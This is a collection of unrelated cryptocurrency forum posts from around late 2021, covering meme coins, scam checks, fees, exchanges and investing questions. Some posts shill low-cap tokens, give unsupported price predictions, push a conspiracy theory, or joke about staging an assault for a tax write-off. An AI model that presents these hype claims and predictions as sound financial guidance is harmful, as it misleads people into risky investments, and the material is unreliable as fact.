keep in mind he is an AVID crypto geek and his bag was already super big of BTC and ETH among others, but he never talked about retiring until SHIB did its huge move a couple weeks ago

fast forward to last week. He is literally no where to found.

he doesnt tell anyone from work that he quit., no two weeks notice no nothing. all the texts that we sent him or really any connection to him is gone.

his facebook, linked in and literally any and all social media is gone.

like he just dropped off the face of the earth, and this didnt happen until AFTER shiba inu mooned.

before he left i asked him about his shiba inu position and all he said was "Oh yeah i already sold it"

but he seemed super like, weird before he left. he gave me this huge talk on friday before he didnt show up on monday and was basically saying like "im just giving the last talks to everyone you know"

he ended up telling me a lot about his life before he left and even said that he would be my mentor (he was already really well off)

but come monday he is literally gone. doesnt respond to texts. doesnt respond to calls, all his social media is deleted.

literally no one knows what happened to him.

but i swear in my gut i feel like he could be the shiba inu whale man

this shit just adds up too perfectly

I guess buying usdt for on the spot trades for small alt coins in the best to keep taxes down? Since usdt isnt fluctuating around in price by the second?

Ok guys in the last couple of days i have seen a lot of posts especially on Twitter about Metaverse ( Im sure you have seen them tio).

As long as I could understand it may be the next generation of the world wide web. But correct me if I'm wrong. 

But my main question is who would benefit the most from it (and don't say Facebook!, haha)? How feasible it is? And please o please explain it like I'm 5 ( I'm a solid 7 actually). 
Where I should invest my 10$ to benefit the most fom Metaverse and ride its surge like a Brazilian hot surfer (man they are hot)
Thanks in advance.

Hey everyone, i apologise if this is a dumb question, but im still very newbie in crypto subject.

I see some hate towards BCH and also dont see much talk about LTC when compared to BTC and ETH.

Both BCH and LTC had their all time high in may of this year, but are now down to around half of that value.

Considering that, although none knows 100% sure, prediction is that BTC will keep rising, followed by ETH and probably by most known crypts like BCH and LTC.

Wouldnt it be fair to assume that both BCH and LTC will reach (maybe surpass) their all time highs in the near future?

If this is not right, please can someone explain to me why?

If this line of thought is right, then why dont we see more talking about investing into BCH and LTC? Just seems like a good deal, but since im a noob i thought id see more experiencied opinions before thinking about making a move.

Thanks.

I'm considering reducing my contribution to my 401k and putting the money instead into crypto.  The obvious benefits would be that crypto is relatively inflation-proof compared to fiat, and the gains could be considerable compared with gold for example (the other non-inflationary way to invest).  Downsides would be that, like an IRA, you have to invest post-tax income, and there's considerable more short term volatility in crypto.
-------------------------------
1 : 2021-11-03
One of the main misunderstandings of the crypto space is the psychology of behavioral economics. Volatility use to scare the crap out of me but then I got desensitized to it, Im sure we all did. Its nothing like the daily minute fluctuations of the S&amp;P500.   

Crypto can go up 34% in one day and then down 86% the next. Its terrifying for new investors to see their funds move like that, I feel they need to be eased into it, put a tiny amount of money in at first, play with it, track it, and start to getting desensitized to it BEFORE they put real money in, before the stakes are on.  

They need to become slowly acclimated and habituated to this completely new way of investing, this emergent market as people call it.    

Along side that, we need to be more supportive and welcoming. We cant shun new investors for making classic mistakes or intimidating them saying well I can stand volatility!, I have diamond hands!, if you dont then just sell and leave! No flexing that youre better then others will make them feel better about putting real money in.   

We have to be honest that this industry is new, scary, and exciting, and we should all work towards being more considerate and understanding to those joining.

Whether you're in favor of cryptocurrencies or against them, there's little doubt that bitcoin and other proof-of-work blockchains use enormous amounts of energy. Much of this energy usage comes from burning coal and other fossil fuels, although cryptocurrency advocates have argued that renewable sources are also a major component. While the exact figures are disputed, even the best case scenarios indicate that mining is a major factor in carbon dioxide emissions
Bitcoin and other cryptocurrencies have an energy and environmental problem. But if done right, it might be possible to channel all that energy into something good for the planet.

Time to play scam or no scam. Today's candidate -- CATGIRL

The dogs have had their day and now a new memecoin is making the rounds. You guessed it. Cat themed. This one is an anime-like token that advertises NFTs, play-to-earn, merch, and a marketplace.  Currently only the NFTs are functional.

How can we tell if this is a SQUID-like rugpull in the works, or yet another crapshoot of a token with so many zeros behind the decimal point your eyes will roll (total supply is one hundred QUADRILLION, that's **100,000,000,000,000,000**)?

We'll use a combination of suggested scam spotting techniques including white paper/team, tokenomics, tokensniffer check, and image checks.  


1. [White paper](https://wiki.catgirlcoin.com/whitepaper/disclaimer)/team: There is a white paper that describes the NFT-oriented token, its uses, and future plans (e.g. play-to-earn). Very light on technical details. The [team](https://wiki.catgirlcoin.com/whitepaper/the-team) is **not verifiable** as they only list first "names" (Ember, Chai, Mocha, Peach).  

2. [Tokenomics](https://wiki.catgirlcoin.com/whitepaper/tokenmetrics): one hundred quadrillion. Why? Who knows accept that people will feel like they are "billionnaires" by owning some. A sample comment from their telegram channel "I got 62 billion, going 100 billion as soon as my transfer is good." Half are to be burnt leaving *only* 50 QUADRILLION tokens. White paper says 1% goes to the team locked for 4 years via DXSale - **Could not be verified** as the site did not load completely (on multiple browsers) to check details.  

3. [Tokensniffer](https://tokensniffer.com/token/0x79ebc9a2ce02277a4b5b3a768b1c0a4ed75bd936) rates the contract address as **HIGH RISK 10/100**.  

4. Images: This appears to be a rip-off of (inspired by?) a Japanese anime/graphic novel series called [NekoPara](https://nekopara.fandom.com/wiki/Nekopara_Wiki) which features sexy characters with cat shaped "ears." The graphics are high quality if that makes any difference.

Bottom Line: There are a lot of red flags here. As always, do your own research.

Of course, 2 PM coincides with the FED meaning so it is likely some changing of leverage/risk. I'm having trouble finding a single equity or crypto not showing something wacky at nearly 2 PM on the dot.

Who was it? What did they do? What opinions changed? Likely hundreds of billions of dollars worth of equity just changed course and set sail on some newly decided trajectory.

To be a fly on the wall....

I'm just glad they like ETH :)

Hello, fellow members of the cryptocurrency community.

I have a question regarding SHIBA.

Im sure you guys are masters in crypto and you would have so much of knowledge to share about crypto.

I usually prefer stonks. And have been holding BTC since 2018 as a word of advice from my friend. I am seeing so much of potential in cryptos future but not sure where to start myself to hit the basics.

I am seriously thrilled to see where I am standing in my BTC asset valuation but for me it is was a easy money. My friend suggested me and I invested. But I want to learn more. The technicalities. The risks. And what are the KPIa of these assets? What parameters I should be looking for? 

I seriously need a word about SHIBA.
Down the line where do you see SHIBA going?
How soon it will pick up the market?
Or anything if I should know before choosing it as the option to put my money in.

I would appreciate it if you guys share your insights and valuable knowledge with me.

As a disclaimer: I have no evidence to provide for this. It's only a hypothesis. 

The reason these coins pump so hard (doge, shib, squid gamesetc) is that central banking institutions and governments are actually pumping them up. *What? Why?* The reason is simple - just think about what the goal of the central banks and old institutions are when it comes to cryptocurrency? They want it to seem like a gamble. They want more regulation. They want age restrictions. The want more taxation, oversight, and more regulations to protect the little man. Ultimately, they seek to destroy the reputation of cryptocurrency all together, so that most people consider it too dangerous and risky. 

Why are so many great projects often overlooked in the market? Why are these risky shitcoins pumping so hard? Its an old scheme called flooding the market. Some bad PR comes out about our company, what do we do? Flood the market with bad PR about other companies, put out dirt on everyone so that the dirt on us doesnt seem as bad. This is a pretty straightforward, well documented PR technique, nothing really too conspiratorial about it. 

So you think old money is pushing *good* projects? Think again. They do *not* want cryptocurrency to succeed. They want crypto to be thought of as a joke. And, unfortunately, its working.

Question: 

Why don't the "Transaction Fees" found on Etherscan.io for a given Hash, match what I get from Coinbase/Metamask?

&amp;#x200B;

Example:

1.) Beginning balances:

Coinbase:  $1,100 USD; 0 USDC; 0 ETH

Metamask: EMPTY

&amp;#x200B;

2.) In Coinbase: Convert $1,000 USD to 1,000 USDC. The Coinbase transaction confirmation shows no fee for this conversion.

&amp;#x200B;

3.) Transfer 999.838217 USDC from Coinbase to Metamask. 

Coinbase confirmation shows no fee for this transfer. 

&amp;#x200B;

4.) Metamask receives 998.00 USDC. Implies 1.838217 USDC network fee.

&amp;#x200B;

5.) Etherscan Transaction Details:

"Tokens Transferred: From Coinbase To My Metamask For 998 USD Coin (USDC) "

"Transaction Fee: 0.001903125 Ether ($5.12)"

"Ether Price: $2,691.17 / ETH"

&amp;#x200B;

6.) Ending balances:

Coinbase:  $100 USD;  0.161729 USDC;  0 ETH

Metamask: 998 USDC, 0 ETH

&amp;#x200B;

The difference between the amount of USDC that left Coinbase and what arrived in Metamask is 1.838217, an implied fee.

Both CoinTracker and TaxBit, which upload data from CB and MM, report a $1.84 fee. (I am evaluating both services and will pick one).

So, why does the Etherscan Transaction Report show a Transaction Fee in ETH with approximate value of $5.12?  I assume that 1.838217 USDC was converted to ETH to pay the Gas Fee, but $1.84 is almost 2/3rds less than $5.12.  How can there be such a large difference in the fees between the transaction data sources?

The amounts are small, but it bothers me when the numbers dont match. As the size and number of transactions increase, I want accurate numbers at tax time.

Any guidance from the community would be greatly appreciated.

I believe EverRise is going to be huge by the end of the year. They already have real world utilities including EverOwn to unlock defi contracts using community votes. There are already large partnerships with contract auditors.

&amp;#x200B;

V2 is also changing over to a staking system and making changes to make it easier for cex to add EverRise.

&amp;#x200B;

The developer, Titan, is one person and has proven to be very efficient at inventing new technologies that would usually take an entire team of coders.

&amp;#x200B;

Get in early while the market cap is still low. If Titan can do this in a few months, image a few years.

BabySquid/Elonsquid/fuckelonsquid/squidfather/babysquid/safesquid/shibasquid/squidcum and so on.

Its funny iam here since february and the scamcoin roulette happens for the third time now.

Do you guys look forward to discussing with people here that didnt got rugpulled in 1 out of those 1000 tokens and have to accept their attitude ? 

I mean i sound a bit snarky but thats not my intent. Its just the market is moving so quick i feel like i already seen it all... twice. 

First we had our Safe/moon/elon or whatever coins then we had all our shib scamcoins and now apparently its squid season.

As always stay safe

Bitcoin is what got many of us into crypto. The OG. The Peoples' Ledger. The Sultan of Stacks. The King of Crypto. The Colossus of Coin. The Great Bitbino.

The number of people who understand Bitcoin are far-and-few between. Test it out yourselves... Go stop one random person on the street and ask, "What is the purpose of Bitcoin?". I happen to be at work, so I stopped the young muscley man walking by me in the hall, who said, "It's fake internet money."

If everyone in the world understood Bitcoin and the current macroenvironment, then the price would be $1-10M/BTC. Clearly, some major breakouts and bull-runs need to happen before we hit that, so let's scale it way back. Let me tell you some things to look forward to, which I think will get Bitcoin to $500,000. Feel free to debate and contest any of these points:

&amp;#x200B;

* USD is currently tanking, which can launch a parabolic phase for BTC (also positive news for you ETH fans)

* 3-day chart is one ingredient feeding into one probable channel (seen below) for price action, which could see BTC at $150k in Q1

* BTC market remains bullish. Evidence of this is the BTC draining from exchanges, as market participants put BTC into cold storage for HODLing. Impact of this means less short-term supply. Until this changes, this will upward pressure on price (simple supply-/demand)
* Comparing the 2017 bullrun to this bullrun shows 1.618 fibonacci at 84K

* Companies are starting to diversify to include BTC in their portfolios. According to advisors, 5% will be the mark for BTC for these portfolios, which could 10x the price. If this becomes the norm adoption for companies, price to $500K+ in the next 5yrs is not unreasonable.

Good afternoon from Europe my dear fellas, 

I know many of you are experienced people who know shit about fuck (as I do) and many others are newbies who came here longing for treasures and millions. Just to put the current and situation into perspective (related to Crypto Market cap and the rising diffusion of crypto ), 

WHAT COULD WE EXPECT REGARDING PUMPS, PRICES, AND MARKET CAPS OF THE TOP 100 PROJECTS IN THE CRYPTO MARKET? 

Many speak about how impossible is for BTC to get to 500 K, I believe that given the crazy scope that may attain crypto is not that unrealistic. (just to give an example)

What do you think guys? will we see game-changing news that will take crypto to Pluto? 

I was watching the TV in Spain this afternoon and I watched a commercial by [Crypto.com](https://Crypto.com) ....and I was like WTF , I can see Spaniards gambling with crypto putting crazy money into it if combined with the catchy news of "the way of Millenials of getting reach by 30" LOL 

&amp;#x200B;

Stay strong and keep checking charts every 2 secs, even if you're hodling for life!!!

Great to see even the older generations getting onboard!  My mom knew that me and my brother are into crypto so I believe that inspired her to get into it.  She actually brought it up to me today about some game she was going to play so she could get $5 of free Bitcoin.  So later I was thinking about that so I mentioned if she signed up for Coinbase she could get $10 free which is double what she was looking at before.  So.. to make a long story short, the crypto world just got a little bit bigger.  Happy to see adoption continue both at home and on the broader spectrum!  
Good luck on your trading! Altcoin season starting my friends!!

so Im not a tech guy nor know thinks about investing but put a few bucks to IOTX. Well nobody wrote about it here but IOTX has hit a new ath of 0.13$ and is going higher, in case you diddnt notice. It went almost double in prize from when it stated to pump. Im happy I put some money there but do you think this gem is worth holding in a long term? The market cap is around 1b so it has room to grow in that area, do you think it has the potential to get in the top50? Thinking about putting some more there.

I havent been in the crypto scene very long, since March. My portfolio consists of top 50 coins. Im not a big gambler so I mostly stick with top 10. My friend the other day texts me and says Ive finally done it. Ive delved into the bottom feeders of crypto. Ive bought a shitcoin called shiborg inu. At first I said lol let me know how that works out and brushed it off. Then I started to thing. This is a guy who has mad a lot in crypto, is very smart about where he puts his money and makes good moves often. Unlike me, I just play it safe. DCA in major coins. I caved. I bought the coin. Only $100 worth. If I lost it I wouldnt be upset but its something I said I would never do. Im going to keep it for a year as an experiment. Im not even going to look at the chart. On Nov 3 2022 Ill open to see what I find. So here it is.shiborg inu to the moon *whispers softly quivering.

Looking at its price history, its always been quite stable, so if it climbs around 100% or so, shouldnt it be quite stable on the correction? 

Im trying to learn more about crypto because it really does seem like a reality in a couple of generations down the line, but in my lifetime Ill be honest Id be happy to make some gains along the way.

I know nobody really knows bc the market is its own entity, but that doesnt mean we cant try and understand it :p

I have a small bag of amp, its one of the few Ive looked into and so I dont feel like a complete idiot and just choose a coin because its doing well in the moment.

Also Im hoping this has just reached the character count, automod told me off for not meeting the minimum word count for the assignment

Look, I get it. Not my wallet, not my crypto. All of the other crypto I have is in personal wallets. However...

I like the fact that I cannot touch my ether because of Coinbase's staking rules. There was a recent post congratulating those who held during the last major drop from ATH $3.5k to $1.8k. I was one of the ones who held. But that was only because I was staking. Listen I have paper hands and I'm always hedging bets but this forced me to just strap in and "enjoy" the ride. And I'm forced to stay strapped in for another couple of years

I'm sure there are reasons not to stake with Coinbase but it's helped... So far

I'm a graduate student in a technical field and crypto is one of my hobbies. This whole thing with Squid Game Token is making me wonder if I could just make my own crypto on Ethereum or Binance Smart Chain.

Not a rug pull of course. Just a silly meme coin that I could put on my resume, maybe put on an application for a PhD program, etc. The way I see it, I might be a student, but even I'm a much better person to invest one's money with than the makers of squid game. Maybe I could make some money off of it as well. For example, if I give myself 500,000 of /u/pizza-eating_newfie's meme coin and it even goes to one cent. Of course, I know this is a very rough approximation and dependent on market cap.

So how hard is it really to make a meme coin? Could one person feasibly do this?

All my BNB was transferred out of my MM wallet while I was sleeping. Can anybody please help or give more information about this address to which the tokens were transferred to?

bscscan: 0xd18d41fde58bfff47f2970c745b65be3d2cf8ff4

This is the wallet to which my funds were transferred. It seems to be the only transaction on it, and the funds are still there (as of now, 33 hours after the transfer). Which seems weird if it was a theft, also because none of my other tokens in my wallet were touched.

Can any more information about this wallet be found somehow? Like perhaps which app or business it is associated with in case this was a glitch and not a theft. (My research shows this has happened before with bad smart contracts.)

Further context:  
I never gave my seed or password to anyone. I do not recall visiting/utilizing any suspect apps. I ran a full scan on my computer for spyware etc (nothing found).

I am struggling financially (poor person) so this loss hurts tremendously. Any help, advice or guidance would be deeply deeply appreciated.

So the IRS is no longer buying the unfortunate boating accident trick. Tried it last year and now I'm up for an audit, so this year I got a bit more creative. I hired some guys in front of home depot to give me a lite beating, lite tazings, and lite stabbings so I could write off my "lost coins" and save millions in txes. Worked like a charm, because the IRS bought the story hook line and sinker. Even got a bunch of press coverage of the event too to make it that much more believable. Now the IRS's audit is going my way thanks to the massive write off this "$5 dollar wrench attack" is getting me. So if you're in trouble with your country's tx authorities, just hire some guys and get yourself a "$5 dollar wrench attack" write off. If you need any connections, I might know a couple of guys who have experience in this field who I can connect you with. I'll take a minor beating any day if it saves me tens of million, or billions one day in txes..

As you guys just saw there was a HUGE dump/manipulation just a few minutes ago. This caused a massive amount of longs to get liquidated across all exchanges.

On the one hand this makes me happy because this took capital and money from the people who use high leverage and cause unhealthy growth. On the other hand I feel a little sorry for those who were average persons and had a long position. But at least I hope they learnt the lesson. 

Also, usually after a big long liquidation comes a corrections (as we saw from the 67k AT high that then dropped to 57k). 

So just beware, do not invest more than you can afford to lose and avoid leverage. Crypto makes some crazy gains anyways.

Hope this helps.

And if you want to leverage your crypto gains consider using leveraged tokens to avoid the risk of liquidation.

Whichever part of the internet you visit, if there is a mention of crypto there will be at least one person trying to scam others. If someone made a post here saying how they are new to this and would like advice, I guarantee they will start getting dms from people trying to scam them, or sending them phishing links.

But YouTube is the worst. You expect nothing good to ever come from Instagram, so seeing people trying to scam less knowledgeable ones is nothing new, but YouTube is absolute hell. Not only is it filled with clickbait videos claiming they know how to make money quickly, but even when you go into normal videos half the comments are from some horrible bots having fake conversations recommending some sort of advisors that personally made them a lot of money. For real, you can barely find regular comments because it's filled to the brim with these scammers and spammers. Just go ahead and try, go to videos about crypto and look at that horrible comment section.

The worst thing is, there is no solution other than to spread awareness and educate people with genuine information regarding crypto. It's sickening how everyone seems to have a hidden goal in mind like shilling for their chosen coin, hoping to make money over other people's lack of knowledge. Too much lack of honesty is present. DISGUSTING.

Today is moon day!

Are you satisfied with your earnings? 

I'm sure I am! I hardly worked to gain them, I didn't even try, I just slipped some jokes here on there and I gained some up doots, but to my credit I tried to be useful, I helped some people and gave my honest opinion. 

What about you? What did you contribute to this community that made you earn your moons today?

If you don't know how much you'll get, just mention 
u/moons_bot in the comments, it will private message you, but beware, the first person who mentions it, it will reply to them in the comments revealing how many you'll get, but after that it will just dm everyone else. It will take some time.

For those interested in crypto who really want to get in on the ground floor of something special. Look into the coin Ryoshis Vision. Built in 1% burn on every buy, trade, and sell which is driving the price way up. In a month I've multiplied my investment by 10x. I'm no financial adviser, but if you missed out on early day Doge or Shib, this is your chance to get on the ground floor and watch your fortune grow. At the very least come check out the community discord https://discord.gg/6wPa7Mt5

I bought Bitcoin at $400. Then I sold it. Then I bought more at $700. And sold it again. Got into silver, then rare coins, and then got back into crypto. Bought some Bitcoin, of course, bought Link and the Stellar Lumens/ XLM, among others. They both seem like great, useful projects that even I can figure out. I'm a 50 year old hunting and pecking. I keep ALL my coins on Coinbase and Pro. It's insured, isn't that right? Crypto is NOT user friendly. I've sent crypto once, ever. Always totally afraid I'm going to screw it up and EVERY time I buy coins I lose money, except for the XLM moon when I sold at .70, .60, .50- ish. The site rescaled the chart in front of my face it was going up so fast. WHY is XLM clearly not doing way better? I always think that this product is geared towards some single mother in Africa. Not a $300 dollar coin, but how about $10? or 5? Why is Stellar at $0.38 cents today??? Am I being impatient and should buy more at this price? Where do you see this coin going? And when. I think most people out here don't know shit about fuck, especially myself. Please enlighten me if you do.

Looks like many bought a highly shilled coin after a 200% move up, just because they heard about it first here. It was indeed shilled quite aggressively..and now its going the opposite direction. Consider it as a hard lesson on how crypto markets work. 


A low cap gem just doesnt end up on the top page here waiting for all of you to take your positions, so that everyone can become rich together. Nah....Shit doesnt work that way

When a post about a low cap coin appears in the top here, it means those posting about it have already taken positions at a much lower level and the coin is being marketed and shilled aggressively here, so that the users from here can become exit liquidity. 

In Loopring's case - it doesnt even have EVM support. It is a limited purpose application specific rollup. Its not going to go up indefinitely. GME may adopt it for its NFT platform, that doesnt mean much tbh, GME is a rather small company and not the leader in tech, like Apple or Amazon.. there is a reason it's seen as a meme stock by the market. It doesnt even post profits, it is a loss making company. 

Thats why you need to be paying attention when someone mentions a low cap coin in comments or a downvoted post, research that instead of downvoting it on sight. The moment a post about a low cap coin enters the top page, its probably too late to make real gains on that and you need to time the market to exit it with gains. Just ask NANO holders who bought it after being shilled here in 2017 December.. many are still bag holding after buying it at &gt; $10 or $20

SHIB prediction: NOT INVESTMENT ADVICE

I did some looking and have predictions for the SHIB max price and Im curious if anyone has any opinions so feel free to share your thoughts.


For this, I compared DOGE and SHIB because they are similar in the fact that they are known as meme coins.


DOGE sat around $0.05 for a while, then jumped to 6x at $0.30, then flattened and dipped a little then went 15x from the original price to about $0.75 as the ATH.


SHIB was around $0.000008 then jumped about 4.5x to $0.000036 or so then flattened and dipped a little. So, the ratio of 4.5/6 is equal to 11.25/15. If it follows the same pattern as DOGE, this means 11x the original price which would be $0.000088 as an ATH.


Keep in mind, Im relatively new to crypto, Ive been in it for 8 months and SHIB is known as a meme coin so its hard to predict. THIS IS NOT INVESTMENT ADVICE so dont get upset if you buy and lose.


Please share opinions and thoughts. Thanks!

I wanted to see if anyone is concerned about a potential sell the news event tomorrow due to auctions.  Everyone is going bizzerk about auctions and how itll push the price up to 200$ or whatever insane estimate they are saying, but that makes me concerned because in all my previous experience, these things turn into sell the news events and dip huge.  Eventually they go up, but I just wonder what people are thinking regarding price movement over the next few days.

Also not looking for price target end of minute!?! like a lot of posts I see other places lol, just a general direction/what to expect.

Thank you!

Many people trade a lot, spend a lot of time on it and then lose money. So they lose both time and money, while they could have just bought BTC and ETH and make better returns. 

If you're not outperforming the market, then consider just DCA'ing into BTC and ETH. You'll still make a lot of money and it costs almost no time.

And then there are coins that sometimes outperform ETH and BTC and sometimes they don't. You can trade these coins to gain against the US dollar, but also against ETH and BTC.

If your coin is losing against ETH, then why take on the extra risk? 

I had this discussion with XRP holders before, they keep on holding on to their XRP, waiting for a 10x. But what if it doesn't? Then the opportunity cost is pretty high, because you could have made more money with Solana, Luna, Avax, Dot and others, which do at times go up against ETH.

**So to make a lot of money you have to ask yourself 2 things:**

1. Am I outperforming the market? If not, just join the market and DCA into BTC and ETH
2. Are my coins under/overperforming the blue-chip coins? If they are underperforming, then why take on the extra risk? **You can buy other coins now, make gains and then buy XRP at 1$ later.**

**Ps. if you are consistantly outperforming the market, this doesn't apply to you. But if you're just losing money, please change your strategy.**

This isnt to say anything negative about brothels. Sex work is real work. But they operate based on people coming in quickly, getting off quickly, and leaving 

Shitcoins are the same way. If you are risk tolerant enough and can lose some money on SquidCats or MuskInu or FlokiFunk, all the power to you. Ive recently dipped into some absolute garbage shitcoins with 2% of my portfolio and the rush is real. Just like with a prostitute, Id guess. 

As long as you have a very quick exit plan and can get a little profit, get out if you dont believe in the project. But if you do, I dunno. Buy her dinner and tell her shes worth more than this and help her apply to community college and get her life back on track with a debt consolidation plan or something

Title speaks by itself.

Crypto is undoubtedly became part of our lives and we can't fake to ignore it anymore. And personally I see no problem talking about it to my close friends / family.

Some people deliberately still stick to the 1st rule: "Do not talk about Fight Club." while others see no issue (I stand more with the 2nd group.)

Within some extent; you should never ask nor give anybody else detailed informations on how much Crypto you own. That's just stupid and pointless.

Take a nerd who got paid in BTC by playing videogames back then. Imagine if he went out with his friends / collegues and told them how much he owned. 10 years later he's now filthy rich and he's llife could potentially be in extreme danger. (I'm not saying that everyone who's an early adopter is now living on a yacht drinking champagne for breakfast, but the chance is there.)

Never ever tell anybody how much you own. And if anybody ask you is either a stupid or has malicious purposes.

Be safe out there and thank you for being here, we still early.

What other Exchanges do you recommend to diversify from Binance?

I am looking for other alternatives to have access to a wider set of coins/tokens that are usually not found in Binance. 

Ideally, I would like to put sone money into another exchange that is well known, reliable and that also lists new coins somewhat sooner than binance.

For example, I would like to buy Telcoin but it is not listed on Binance yet.

Thank you for your help in advance.

Hello, I am using Argent wallet and Im trying to withdraw about $350 worth of aKNC (Aave KNC). However the ether gas prices for the withdraw are close to $200!? How can anyone transact on Etherium with fees this high? Seems crazy. Ive been trying to withdraw this money for about a year but the gas prices have not fluctuated but much. This is giving me some pause in investing in other ether based tokens. I dont want to get locked in because of high gas fees. 

Any insights would be appreciated!

I invested about $ 4000 in a SQUID coin. It was the money I was saving for the last 2 years.

And it paid off, I literally made millions.

Since I am in another city and my book with written passwords and the phone on which the exchange was installed are at home, I cannot raise my profit, yet. So I guess I will still hold it.

Anyway why dont people talk about this? Is it out of jealousy, is it out of envy?  What is wrong with people, everyone should know how great thing happened.

I have no advice to give you, I was just lucky.

I believed in myself and invested money. If I had listened to your ~~stupid~~ advice I would never have made a cent.  

I haven't seen a single post about this in the last few days, I think all of you should give more credit to us who gambled and one. But I guess this sub is not having it.

Basically what the title says. I bought some Loopring a couple days ago and I'm watching the charts thinking of what to do now. A small correction was inevitable of course. But I'm wondering if we've already reached the stage of "selling the news" or if it will continue to go up in the following days.

Personally I think there's still some more growth to come, but that might just be buyer bias. What do you all think?

Regardless I'll make my own decision on the matter and act accordingly, but I'm curious. LRC seems like a pretty decent project all around, but I'm a bit suspicious I haven't heard many cons about it.

Guys the big bad wolf( banks &amp; mark cuban) are trying to buy up for cheap, with a bear trap, don't let them trick you, this always happens.  Those mother-fudders :/

Never sell , hold, forever. Don't cry when it happens and I say I told you so, or do. btc eoy $150-600k easy.

Bitcorn  will bounce back even stronger. Bull market is not over yet.

According to my trusted analist, right now the death cross end will align with when salvador fully adopts bitcion &amp; the resulting volume will boost 50 day average, therefore no more death cross.

I truely believe this will trigger another bull market (very bullish myself, the bs variant). Think about the value, an extra $150m in the strike network. Don't know what the fud about it being backed by tether is? Especially because of the clean record of the president of salvador.

Bitcoin is utility, utility is bitcoin, lightning network is amazing, just just used it yesterday.

Personally, very bullish

You may have noticed that the modern form and structure of lending consists of a lending platform that earns interest from borrowers and distributes it among lenders. Surprisingly, there is no lending platform that provides zero-interest loan but takes a commission from borrowers.

 Although, not entirely a lending based method, e-commerce systems like Uber, eBay, Amazon, Airbnb etc. are some great examples that works perfectly on the commission-based model. Why not applying this principle to solely lending platforms through the harnessing of block-chain technology? Instead of fixed or variable interest, this new model will let people borrow token(s) and move token(s) into a auto-created crypto fund with single token(s) and trade it in whatever form they desire: swap it, stake it, but/sell any token. If the borrower makes money, then the lending platform takes a share and like e-commerce platforms: no profit will result in no commission. It is that simple. No complex interest calculations, no hidden fees, and no payment dates! What do yo think about this platform?

It is actually quite easy to keep up with the trends. In 2020 it was DEFI, in 2021 it was NFT first and then METAVERSE. The writings were on the wall. You just need to catch a wave. For example it was pretty obvious after Zuckerberg was talking about the metaverse. Also, Decentraland had huge names on it for example Paris Hilton.

It is actually quite easy to keep up with the trends. In 2020 it was DEFI, in 2021 it was NFT first and then METAVERSE. The writings were on the wall. You just need to catch a wave. For example it was pretty obvious after Zuckerberg was talking about the metaverse. Also, Decentraland had huge names on it for example Paris Hilton. Sandbox had Snoop ducking Dog hosting a live event. It was really easy to catch that wave in retrospect. OR (shameless plug) our article posted on the subs here on Sept 11. [https://loftfinancial.com/investing-in-the-metaverse/](https://loftfinancial.com/investing-in-the-metaverse/) It didn't get much love but hear this out: Sand is 500% up, Mana is 500% up, Cube is a 10X yea ladies and gents 1000% up and Atari 100% up from the time of posting.

Continuing the shameless plug you may want to subscribe to our newsletter [here](https://substack.com/sign-in?redirect=%2Fpublish&amp;for_pub=theloft&amp;error=You%27re%20logged%20in%20as%20blocker1%40protonmail.com%2C%20but%20this%20page%20is%20private.%20Try%20logging%20in%20with%20a%20different%20email%2C%20or%20letting%20the%20author%20know%20they%27ve%20linked%20to%20a%20private%20page.&amp;change_user=true)

I am wanting to start a new portfolio and was wondering how everyones portfolios are looking in terms of % allocation to certain coins within it.

How do you go about deciding the spread? 
Do you have a specific strategy or do you just throw money in a set ratio and stick with it?

Currently i am thinking of going for 40% ETH, 15% BTC, 15% ALGO, 15% XLM and 15% ADA

I would also like to hear some people opinions on the coins in my list and why or why not you think they are good choices to invest in, maybe even suggest alternatives i should research into?

Finally, what do people think of now as a time to buy, a lot of all time highs are being hit across the market?

Not looking for financial advice. Just wanting to see the opinions on others.

Dear fellow Cryptoholics, 

stories of insane gains, crazy shitcoin investments, and the general advance of Cryptocurrencies making us lose our proportionality for gains. 

Everywhere in the WWW and especially here on Reddit, you can find posts of people, who are disappointed because they "only" made 30% gains, missed the last moonshot again, did not invest in Bitcoin in 2010, you name it...

Look back from time to time, look at what your ETFs did the last 20 years, what your bank did pay you for investments, how much your house increased in value, etc. pp. This perspective shift will open your eyes and bring you back to the ground. 
Especially people, who create mimimi-posts about how hard it was to sit through a painful bear market after their unrealized gains dropped from 80% to 30%. You would rarely be able to get 30% in a few months or weeks in the dark era B.C.C. (before Cryptocurrencies).

Sidenote: If you want to make money, forget about getting rich quick and dogs. Take profits on the way and diversify. If you build up your portfolio step by step and settle your expectations, you will be happy with 30%, which you can build another 30% on and you won't let go of 80%. Long-term thinking and investing (HODL) need a suitable character. If you can't do it, think in smaller steps. Take that 80% and some time to think about your next step. 

Don't aim for 3000%. Enjoy 30%, because it is what you have and that is much more than ever before.


Clear heads for your journey guys!

Recent example, [crypto.com](https://crypto.com) has a contest, where the largest SHIB net buyer wins $1,500. Binance runs tons of contests, that operate on the same basis. All trades for a certain crypto over a specific duration will get measured and the largest trader will receive the bonus. 

How does this make any sense? 

It's just feeding the whales and usually doesn't even do much for them anyways. Given how there's people dropping multiple millions into SHIB, giving $1.5k to the largest buyer is like a drop in the ocean for them and having it be awarded to the single largest buyer also ensures, that this promotion is completely irrelevant to any normal-sized crypto holder. Maybe there's a total of 5 traders, who have a chance of winning, yet every single [crypto.com](https://crypto.com) customer gets confronted with that promotion. 

Why do exchanges even bother with this stuff?

Hey guys ima be brief, Can anyone else post on Coinbase subreddit? I legit posted twice over an issue Im having with their service which btw I CANT EVEN CONTACT THEM THROUGH COINBASE, THATS WHY I SEEKED HELP THROUGH THEIR REDDIT, but every-time I try to post on their Reddit, my post get deleted. Anyone else having this problem? (Im not disclosing any personal information and Im not being vulgar, yet they get removed right away once it says something bad about their service) Yeah, I know Coinbase sucks ass, thats why I need to contact them so I can get my coins out of there and start using a different exchange (Yeah I know I dont need Coinbase permission to remove my coins but I need to contact them over something else.)Since were on the topic of Exchanges, any other exchanges yall recommend?

I overheard a conversation this morning about a recent "rug pull" which occurred in a squid themed coin.
After hearing the thoughts from one participant, the other said "See? This is exactly why I have never bought into BTC. Nobody really knows who created it and that means that nobody could be held accountable for a huge scam happening".

I thought about this for a while after and decided I'd like to post about this view point. I remember being told something similar years ago when talking to a financial advisor about buying in. Has anyone else heard this arguement? Anyone else feel this way?

The discussion went on to talk about other coins having publicly known creators and a few were named.

I decided to start looking into fail safes and reasons why this couldn't be a reality. Looking for additional thoughts on this as well. 
I currently do not have an opinion formed on this. I just have never seen a post or article about this concern anywhere since buying my first crypto a few years ago.

The other side of this "coin" would be - were there telltale signs that should have tipped off uninformed buyers of this squid coin? 

I felt a post to bring awareness might be very beneficial to newer or less informed buyers.

